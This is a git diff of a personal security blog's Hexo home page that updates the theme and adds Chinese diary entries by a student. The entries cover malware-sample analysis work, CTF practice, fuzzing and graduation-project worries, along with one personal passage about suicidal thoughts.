@@ -1,90 +1,52 @@
 <!DOCTYPE html>
-
-
-
-
-
 <html lang="en">
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 3.9.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.1">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.1">
-  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
   <link rel="manifest" href="/images/manifest.json">
 
-<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+<link rel="stylesheet" href="/css/main.css">
 
 <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Times New Roman:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
-
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Gemini',
-    version: '7.4.1',
-    exturl: false,
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    copycode: {"enable":true,"show_result":true,"style":"mac"},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: false,
-    lazyload: false,
-    pangu: false,
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: 'search.xml',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    translation: {
-      copy_button: 'Copy',
-      copy_success: 'Copied',
-      copy_failure: 'Copy failed'
-    },
-    sidebarPadding: 40
-  };
-</script>
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"spwpun.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
 
   <meta name="description" content="Sharing, Communicating more, then moving on......">
-<meta name="keywords" content="Blog, Cyber Security, Info Sec">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Spwpun&#39;s Blog">
 <meta property="og:url" content="https://spwpun.github.io/index.html">
 <meta property="og:site_name" content="Spwpun&#39;s Blog">
 <meta property="og:description" content="Sharing, Communicating more, then moving on......">
-<meta property="og:locale" content="en">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="Demen Lee">
+<meta property="article:tag" content="Blog, Cyber Security, Info Sec">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Spwpun&#39;s Blog">
-<meta name="twitter:description" content="Sharing, Communicating more, then moving on......">
-  <link rel="canonical" href="https://spwpun.github.io/">
+
+<link rel="canonical" href="https://spwpun.github.io/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome: true,
-    isPost: false,
-    isPage: false,
-    isArchive: false
+    isHome : true,
+    isPost : false,
+    lang   : 'en'
   };
 </script>
 
   <title>Spwpun's Blog</title>
   
-
-
 
 
 
@@ -103,7 +65,6 @@
   .use-motion .post-body,
   .use-motion .collection-header { opacity: initial; }
 
-  .use-motion .logo,
   .use-motion .site-title,
   .use-motion .site-subtitle {
     opacity: initial;
@@ -121,19 +82,8 @@
   <div class="container use-motion">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-container">
-  <div class="site-meta">
-
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Spwpun's Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-  </div>
-
   <div class="site-nav-toggle">
     <div class="toggle" aria-label="Toggle navigation bar">
       <span class="toggle-line toggle-line-first"></span>
@@ -141,97 +91,86 @@
       <span class="toggle-line toggle-line-last"></span>
     </div>
   </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Spwpun's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
 </div>
 
 
+
+
 <nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-      
-      
-      
-        
+  <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
-      
-    
 
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
 
   </li>
-      
-      
-      
-        
         <li class="menu-item menu-item-about">
-      
-    
 
-    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
 
   </li>
-      
-      
-      
-        
         <li class="menu-item menu-item-tags">
-      
-    
 
-    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
 
   </li>
-      
-      
-      
-        
         <li class="menu-item menu-item-categories">
-      
-    
 
-    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
 
   </li>
-      
-      
-      
-        
         <li class="menu-item menu-item-archives">
-      
-    
 
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
 
   </li>
       <li class="menu-item menu-item-search">
-        <a href="javascript:;" class="popup-trigger">
-        
-          <i class="fa fa-search fa-fw"></i>Search</a>
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
       </li>
-    
   </ul>
-
 </nav>
-  <div class="site-search">
+
+
+
+  <div class="search-pop-overlay">
     <div class="popup search-popup">
-    <div class="search-header">
+        <div class="search-header">
   <span class="search-icon">
     <i class="fa fa-search"></i>
   </span>
   <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+    <input autocomplete="off" autocapitalize="off"
            placeholder="Searching..." spellcheck="false"
-           type="text" id="search-input">
+           type="search" class="search-input">
   </div>
   <span class="popup-btn-close">
     <i class="fa fa-times-circle"></i>
   </span>
 </div>
-<div id="search-result"></div>
-
-</div>
-<div class="search-pop-overlay"></div>
-
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
   </div>
+</div>
+
+    </div>
+  </div>
+
 </div>
     </header>
 
@@ -244,76 +183,59 @@
   <a href="https://github.com/spwpun" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
 
 
-    <main id="main" class="main">
+    <main class="main">
       <div class="main-inner">
         <div class="content-wrap">
-            
+          
 
-          <div id="content" class="content">
+          <div class="content index posts-expand">
             
-
-  <div class="posts-expand">
-        
+      
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2049/09/01/Note/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Demen Lee">
       <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
-      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Spwpun's Blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2049/09/01/Note/" class="post-title-link" itemprop="url">Notebook</a>
+        <h2 class="post-title" itemprop="name headline">
           
-        </h1>
+            <a href="/2049/09/01/Note/" class="post-title-link" itemprop="url">Notebook</a>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
+                <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              
-                
-              
-
               <time title="Created: 2049-09-01 00:04:29" itemprop="dateCreated datePublished" datetime="2049-09-01T00:04:29+08:00">2049-09-01</time>
             </span>
-          
-            
-
-            
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
+                  <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
                 <time title="Modified: 2020-11-09 18:51:23" itemprop="dateModified" datetime="2020-11-09T18:51:23+08:00">2020-11-09</time>
               </span>
-            
-          
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
+                <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">In</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Thought/" itemprop="url" rel="index"><span itemprop="name">Thought</span></a></span>
-
-                
-                
-              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Thought/" itemprop="url" rel="index"><span itemprop="name">Thought</span></a>
+                </span>
             </span>
-          
 
           
             <span id="/2049/09/01/Note/" class="post-meta-item leancloud_visitors" data-flag-title="Notebook" title="Views">
@@ -323,18 +245,17 @@
               <span class="post-meta-item-text">Views: </span>
               <span class="leancloud-visitors-count"></span>
             </span>
-          
   
   <span class="post-meta-item">
     
       <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
+        <i class="far fa-comment"></i>
       </span>
-        
-      
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/2049/09/01/Note/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2049/09/01/Note/" itemprop="commentCount"></span></a>
+    <a title="valine" href="/2049/09/01/Note/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2049/09/01/Note/" itemprop="commentCount"></span>
+    </a>
   </span>
   
   
@@ -349,16 +270,86 @@
 
       
           <h3 id="2020-11-09"><a href="#2020-11-09" class="headerlink" title="2020-11-09"></a>2020-11-09</h3><p>感觉像是重新回到大一一样，开学不知道为了啥，一个劲儿的参加各种活动。到最后还是发现没有什么卵用，所以还是自己收敛一下自己的玩心，好好学习吧！</p>
-          <!--noindex-->
-          
-            <div class="post-button">
-              <a class="btn" href="/2049/09/01/Note/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
+<p>之前导师一直在叫我学习关于SQLite的一些漏洞挖掘的知识，让我去调试一些CVE漏洞，可是我发现调漏洞并不是那么理所当然的事，把关于漏洞的版本信息、补丁信息、PoC信息以及漏洞提交者所给出的触发流程等全都弄清楚了，也没法完全复现出漏洞的效果，也许我真的是太菜了。</p>
+<p>所以导师应该看不下去了，让我跟着师姐做另外的协议漏洞挖掘了。</p>
+<p>也参加了所里面的CTF月赛，不过课上的大作业和导师给的任务让我没有太多时间去学习。（其实是自己太贪玩了)下一次是14号，尽量把时间都腾出来参加吧。</p>
+<h3 id="2020-09-20"><a href="#2020-09-20" class="headerlink" title="2020-09-20"></a>2020-09-20</h3><p>顺利度过了7、8月，顺利开学了。目前已经上了一周的课了。</p>
+<h3 id="2020-06-17"><a href="#2020-06-17" class="headerlink" title="2020-06-17"></a>2020-06-17</h3><p>开始学习新东西，AFL，一个用于模糊测试的漏洞挖掘测试工具。</p>
+<p>前几天参加了一个国外的CTF，NahamCon CTF，只做了几道热身题，就不想做了，后续看了看CTFtime上的wp，发现一个好玩的东西，The wayback machine，用于开源信息收集（OSINT）的，可以查看网站的归档和修改历史，尝试了一下自己以前的博客，幸好没有。</p>
+<h3 id="2020-05-22"><a href="#2020-05-22" class="headerlink" title="2020-05-22"></a>2020-05-22</h3><p>终于在Windows上安装了python2的符号执行angr环境，得益于国外大佬的一个github项目：<a target="_blank" rel="noopener" href="https://github.com/andreafioraldi/angr-win64-wheels%E3%80%82%E4%BD%86%E6%98%AF%E5%A5%BD%E5%83%8F%E9%87%8C%E9%9D%A2%E7%BC%BA%E4%BA%86%E4%B8%80%E4%B8%AAsimuvex%E7%9A%84whl%E6%96%87%E4%BB%B6%EF%BC%8C%E6%9C%89%E7%82%B9%E7%96%91%E9%97%AE%EF%BC%8C%E6%89%80%E4%BB%A5%E5%9C%A8%E9%A1%B9%E7%9B%AE%E4%B8%8B%E7%BB%99%E5%A4%A7%E4%BD%AC%E5%8F%91%E4%BA%86%E4%B8%AAissue%EF%BC%8C%E6%9C%9F%E5%BE%85%E5%A4%A7%E4%BD%AC%E7%9A%84%E5%9B%9E%E5%A4%8D%E5%90%A7%E3%80%82">https://github.com/andreafioraldi/angr-win64-wheels。但是好像里面缺了一个simuvex的whl文件，有点疑问，所以在项目下给大佬发了个issue，期待大佬的回复吧。</a></p>
+<h3 id="2020-05-20"><a href="#2020-05-20" class="headerlink" title="2020-05-20"></a>2020-05-20</h3><p>2020520，我在弄Windows上的远古angr环境，以期能够达成毕设的最优目标，现在看来是不可能的了。</p>
+<h3 id="2020-04-08"><a href="#2020-04-08" class="headerlink" title="2020-04-08"></a>2020-04-08</h3><p>​        果然之前都是闲得慌却不想学习而自怨自艾出来的心理疾病，现在毕设迫在眉睫了，专心去做事了就不会胡思乱想了。</p>
+<p>​        今天把之前的开题报告完善好了，也在知网上提交了，安排后面一个多星期的时间节点，初稿也快出来了吧（/憨笑）。学习？学习是不会上瘾的。也发现一个问题，就是做事需要有音乐陪伴，而且到了晚上尤其是凌晨0点到1点之间，才有动力去做，白日里就很慵懒的感觉，也不知道是不是所有毕业生都和我一样？（/再笑）。在此立下Flag，到4月20日时，一切都会如期进行。没有的话，我倒立拉shi。：）</p>
+<p>​                                                                                                                            于 凌晨。</p>
+<h3 id="2020-03-30"><a href="#2020-03-30" class="headerlink" title="2020-03-30"></a>2020-03-30</h3><p>决定迎接新生活，最近的悲观情绪确实有点多。似乎每年的春天都是这个样子，加上今年疫情的影响，再这样下去感觉要有严重的心理疾病了。所以在今天和过去做个了断吧。</p>
+<p>今后的自己保持一个稳定的性格，不要那么多变！</p>
+<blockquote>
+<p>晚上睡觉的时候总想如果自己决定要suicide的话，要先和谁告别一下，结果想了很多，喜欢的人、亲人、挚友、导师，还有很多曾经以那么阳光的面孔对待我的人，我和这个世界还存在着很多的联系，也许等到哪一天这些联系都没有了的话，我也许就会很快决定了吧！</p>
+</blockquote>
+<h3 id="2020-03-11"><a href="#2020-03-11" class="headerlink" title="2020-03-11"></a>2020-03-11</h3><p>越来越觉得，和别人交流处于一种乏力的状态。</p>
+<h3 id="2020-03-06"><a href="#2020-03-06" class="headerlink" title="2020-03-06"></a>2020-03-06</h3><p>Godaddy购买的域名过期了，42天之后才会真正取消，刚才重新布置了一下博客的配置，<code>busuanzi</code>统计的数据好像都丢失了。不过关系不大，只是为了好看而已。询问了同学是否要购买一个长期的自己的域名，最后决定自己不买了，后面自己做什么事也不知道，这个博客就先这样吧。听了学弟的一个讲座，觉得自己在网络上的习惯还是差太多了，不过话说OSINT的功能真强，网络果然不是法外之地。</p>
+<p>我是个小菜鸡，嘤嘤嘤。</p>
+<h3 id="2020-01-05"><a href="#2020-01-05" class="headerlink" title="2020-01-05"></a>2020-01-05</h3><p>心灵空虚的人似乎都会以另外一种方式来填充自己，无论是在自己的个人博客写自己的心灵独白，亦或是开一个公众号写自己在独自思考时产生的与平时格格不入的言语。</p>
+<h3 id="2019-12-19"><a href="#2019-12-19" class="headerlink" title="2019-12-19"></a>2019-12-19</h3><p>上周和老师交流之后，这周的任务主要是去找机器学习的数据集，可是我发现好难找，也许我对数据集都还没有一个明确的定义。鹏哥也尝试帮我，最后也只得说上一句，”你再去调研调研吧！“。对鹏哥感动的一点是今天因为感冒请假了，他还问我周六团建去不去玩，我自觉不能再浪了，收收心好好做毕设了吧。</p>
+<p>现在的想法，机器学习需要数据集，而在代码层面的数据集只是一个矩阵，一条条有了量化定义的数据吧，这和我之前所接触到的样本的定义是完全不同的啊。我应该需要自己想，混淆后的PE文件样本，有没有什么可以量化的特征可以提取出来的，通过提取特征量化后的数据来构建数据集，然后用来训练学习模型。我的输入既然是在IDA中的idb文件中，也许我该去仔细了解idb文件中都有哪些数据可以提取。网上开源的数据集我想我是没有指望了。</p>
+<h3 id="2019-12-13"><a href="#2019-12-13" class="headerlink" title="2019-12-13"></a>2019-12-13</h3><p>会在微博发一些平时遇到的小知识点、小技巧之类的，所以昨天在<code>social links</code>把微博的链接也加上了。</p>
+<p>上周和研究生导师电话交流了一下，建议我再看看我的这个毕设题目，毕竟我说的难点好像在她看来并不是难点，其实现在想来只是自己在之前没有理清思路而已，难点应该在如何结合到理论算法、以及特征识别上来。之前看过一部分论文，感觉讲得也不是太清楚。今晚回学校看看相关的论文，整理一下其他人的方法，然后明天再和老师联系一下。</p>
+<p>其实最近的心情起伏很大，我想在别人面前表现的尽可能开朗一点，但其实最真实的是很多人都有自己的世界，想要别人懂你是一件很难的事。保持敬畏之心吧！</p>
+<p>今天是国家公祭日，铭记历史，不忘耻辱！</p>
+<h3 id="2019-12-06"><a href="#2019-12-06" class="headerlink" title="2019-12-06"></a>2019-12-06</h3><p>最近开始主动向部门经理要样本分析的任务，上周刚分析完5个类似的样本，都是同样的提取网络通信特征的任务，这周我再要的时候，一下子给我21个，难顶。我要个任务都这么卑微的吗？刚才突发奇想想换毕设的题目，就是打算跟着信工所那边的导师做项目，顺便当做毕设吧，明天和老师联系一下，看一下可行性。</p>
+<p>这学期开学时报了学校“明远·启航”的声乐课，每周四都要去上课，老师教的练声很有用处。这周六有一个合唱演出，下周就结课了，想想还真挺快的。</p>
+<h3 id="2019-11-25"><a href="#2019-11-25" class="headerlink" title="2019-11-25"></a>2019-11-25</h3><p>毕设开题报告已经展示过了，但是还是有很多的问题。不知是老师对相关领域的不熟悉，还是我自己的理解有问题，也许我需要做的还是有很多吧。决定这周熬夜做一个demo出来找老师看看。实在不行也可以按照老师给的想法，不局限于做IDA的插件，也许机器学习算法可以自己实现呢，不需要什么python的库呢。总之，自己加油，做出个样子吧。</p>
+<h3 id="2019-11-23"><a href="#2019-11-23" class="headerlink" title="2019-11-23"></a>2019-11-23</h3><p>昨天和前天做完开题报告，今天回到公司上班了，经过开题报告，觉得这一段时间自己还是划水太多了。所以回到公司就想鹏哥问有没有样本可以分析。还是觉得按照自己学习爱看书的尿性，是真的很难进步，至少有样本在分析可以给自己一种紧迫感。</p>
+<h3 id="2019-11-14"><a href="#2019-11-14" class="headerlink" title="2019-11-14"></a>2019-11-14</h3><p>10月底去了一趟西安，感触很多，不过越来越不想再出去玩了，一是资金，二是时间。自从上次分析完那批样本，部门经理似乎已经不管我这个打白工的实训生了，没有再给过我样本来分析，也好，自己看书也不错，但总是心里不踏实。</p>
+<p>看《IDA Pro》了解了很多IDA使用的细节方面的东西，毕设是打算做一个IDA的反混淆插件，多珍惜时间吧。别人的时间不知为何就那么随意浪费，自己先珍惜好自己的时间吧。这个周末把开题报告写完吧，一直在犹豫要不要花钱买一个机器学习的在线课程来学一下，听了前面的一章的课，惊叹别人的逻辑时如此缜密。</p>
+<p>最近发现看书看着看着会很困，所以就去刷看雪上和XCTF上的逆向题，也还好，还处于入门阶段，也一直想在先知投个稿试试，但是觉得自己解决的问题基本别人都有解答了的啊，苦恼，我想赚点钱啊！</p>
+<h3 id="2019-10-17"><a href="#2019-10-17" class="headerlink" title="2019-10-17"></a>2019-10-17</h3><ol>
+<li>这两天在公司没有样本分析，于是就看起了《IDA Pro》，慢慢看书梳理经历过的知识对我来说是一个很好的方法。</li>
+<li>和同学约好周末一起去都江堰了。</li>
+<li>认识的一个朋友又去深信服了，月薪10k+，3年后我会去哪里呢？</li>
+</ol>
+<h3 id="2019-10-13"><a href="#2019-10-13" class="headerlink" title="2019-10-13"></a>2019-10-13</h3><ol>
+<li>这个星期在公司主要分析了宏病毒，使用VBE调试VB代码，很恶心的是居然使用宏代码进行注入，到最后也没能完全把注入的PE代码给提取出来，准备在自己的电脑上在试试吧。</li>
+<li>毕设由于种种问题不能去研究所跟导师做了，现在很烦。</li>
+<li>这个月的事不多，但都挺让人心烦意乱的了。</li>
+</ol>
+<h3 id="2019-10-07"><a href="#2019-10-07" class="headerlink" title="2019-10-07"></a>2019-10-07</h3><ol>
+<li>这个新博客已经完善得差不多了，本来想加上评论系统的，但是一直出问题，而且发现评论系统的网站的访问速度有点慢，遂弃！</li>
+<li>原来写过CSDN，也自己搭建过VPS上的blog，最终还是用这个吧，简单明了。</li>
+<li>新的开始，保持记录吧！</li>
+</ol>
+<h3 id="2019-10-03"><a href="#2019-10-03" class="headerlink" title="2019-10-03"></a>2019-10-03</h3><ol>
+<li>新建了依托于github的博客。</li>
+<li>发现其实<code>hexo</code>挺强大的，后面也可以添加一些第三方服务，评论啊什么的，明天再弄吧！</li>
+</ol>
+<h3 id="2019-09-16"><a href="#2019-09-16" class="headerlink" title="2019-09-16"></a>2019-09-16</h3><ol>
+<li>今天重新弄了一下这个博客，刚开始把什么开发过程全忘了，只能小心翼翼的在<code>Xshell</code>上弄，从删掉最丑的背景图开始，仔细检查服务器上的代码和本地的代码是否一致……</li>
+<li>为了不让github提示我的代码有漏洞，决定将<code>Django</code>版本升级到<code>2.1.11</code>, 修改了<code>requirements.txt</code>中<code>django</code>对应的版本，使用<code>pip install -r requirements.txt</code>进行升级。</li>
+<li>然后就遇到一个500(<code>Server error</code>)的<code>Bug</code>，经大佬们提醒，我暂时打开了<code>Debug</code>模式，仔细查看，才想起这是当初遇到的<code>Bug</code>,只要在<code>Python</code>的<code>base.py</code>中修改一下代码就可以了。</li>
+<li>之后打算给小破站配个免费的<code>SSL</code>证书，然后鼓捣了一下午加一个晚上，服务器差点搞崩了，了解了<code>yum, python</code>之间的依赖关系，最后通过<code>Letsencrypt</code>的方法还是走不通，问了一下*哥，他说用<code>cloudfare+cdn</code>要好一点。</li>
+<li>去查了一下这些个配置方法，好多，不想看，主要是思路和我这半天了解到的不太一样，没看懂。</li>
+<li>回到搜索“最简单的免费配置<code>SSL</code>证书”上来，发现一个叫<code>Freessl</code>的网站，看他域名这么简单，应该也挺简单的吧！果然，证书生成、域名检测、部署配置一条龙打通，值得一提的是它的一键部署是将你本地生成的证书和私钥文件通过<code>SSH KEY</code>/服务器密码的方式直接传到你的服务器上，然后只需要在服务器上修改<code>nginx</code>配置，重启<code>nginx</code>就可以了。</li>
+<li>最后，明天会有好事发生！Ebrn</li>
+</ol>
+<h3 id="2019-09-05"><a href="#2019-09-05" class="headerlink" title="2019-09-05"></a>2019-09-05</h3><ol>
+<li>今天分析一个韩国的<code>hwp</code>样本，不知道自己为什么和喵喵比起来分析得那么慢，他说在网上搜索就直接有现成的分析报告，但是我的好像都没有，而且看日期还是前个星期才编译的呢。</li>
+<li>样本属于宏病毒（实际上就是嵌套在文档中的脚本文件），<code>hwp</code>使用的是<code>PostScript</code>,早上看了其他类似的分析报告，了解了大致的分析思路，一整个下午就在调试，通过<code>OD</code>加载<code>hwp</code>的<code>gbb</code>可执行文件，来调试通过<code>hwpscan2</code>扫描出来的<code>ps</code>脚本，最后在内存中<code>Dump</code>出来了一个<code>PE</code>文件，用<code>ida</code>查看之后，发现是使用<code>Delphi</code>编译的<code>Dll</code>文件，和昨天分析那个一样，但是主要的功能和用<code>Systemtracer</code>监测到的不一样，估计还有其他的<code>PE</code>文件没有<code>dump</code>出来，或者<code>shellcode</code>。</li>
+<li>越来越发现自己是一个赖不住寂寞的人，也才想着来自己的网站倾述自己一天的生活吧！</li>
+</ol>
+<h3 id="2019-09-03"><a href="#2019-09-03" class="headerlink" title="2019-09-03"></a>2019-09-03</h3><ol>
+<li>今天分析一个<code>Delphi</code>编写的<code>Dll</code>，很多函数都是不能直接反编译的，开始了解花指令。</li>
+<li>练习<code>PWN</code>，遇到整数溢出的题，属于上界溢出，由此可以利用栈溢出，很有意思，不过最后还是有点不太明白为什么要进入交互模式才能得到<code>flag</code>.</li>
+<li>收集奖学金和保研的材料时，看着自己大三这一年的碌碌无为，参加了不少比赛，因为菜，而毫无作为！感到伤心。</li>
+</ol>
+<h3 id="2019-09-02"><a href="#2019-09-02" class="headerlink" title="2019-09-02"></a>2019-09-02</h3><ol>
+<li>借鉴Sakura大佬的博客，我也写一个简短的生活记录吧！</li>
+<li>暑假结束了，实习没有结束，一直在做病毒分析的工作，渐渐对二进制逆向和<code>pwn</code>产生了浓厚的兴趣。</li>
+<li>保研虽然我们专业只有我和另外一位大佬竞争，按照往年的名额，感觉也可以，但我心里还是隐隐担心差那么一点点。</li>
+<li>九推投了信工所，和之前联系的李*老师邮件交流，回复很快，挺开心。</li>
+<li>校招投了奇安信，打算如果可以的话，之后自己去找实习吧。</li>
+<li>在知乎上问了一个问题，得到了很多大佬的回答，感触良多，嗯，找准自己的方向，潜心修行吧！</li>
+</ol>
+
       
     </div>
 
@@ -366,89 +357,73 @@
     
     
       <footer class="post-footer">
-          <div class="post-eof"></div>
-        
+        <div class="post-eof"></div>
       </footer>
   </article>
   
   
   
 
-    
-        
+      
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/11/18/blog迁移小记/">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/11/18/blog%E8%BF%81%E7%A7%BB%E5%B0%8F%E8%AE%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Demen Lee">
       <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
-      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Spwpun's Blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2020/11/18/blog迁移小记/" class="post-title-link" itemprop="url">blog迁移小记</a>
+        <h2 class="post-title" itemprop="name headline">
           
-        </h1>
+            <a href="/2020/11/18/blog%E8%BF%81%E7%A7%BB%E5%B0%8F%E8%AE%B0/" class="post-title-link" itemprop="url">blog迁移小记</a>
+        </h2>
 
